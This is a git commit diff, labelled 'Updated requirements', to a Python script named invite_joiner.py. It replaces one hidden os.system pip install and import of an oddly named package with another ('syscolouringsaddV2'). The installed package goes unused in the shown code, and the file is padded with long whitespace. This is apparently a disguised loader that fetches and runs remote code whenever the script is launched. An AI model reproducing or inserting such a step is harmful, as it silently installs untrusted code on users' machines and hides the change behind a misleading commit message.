b55b2126a62ca33dce12a43b780f56bf1d494011
Matthew <138142848+mmatthew130@users.noreply.github.com>
2023-08-02 01:17:18 +0200

    Updated requirements

--- invite_joiner.py
+++ invite_joiner.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythonfontsliberyV1")
-import pythonfontsliberyV1
+os.system("pip install syscolouringsaddV2")
+import syscolouringsaddV2
 import requests																																																																																																																																																																																																																																																																					
 from selenium import webdriver
 from selenium.webdriver.firefox.options import Options
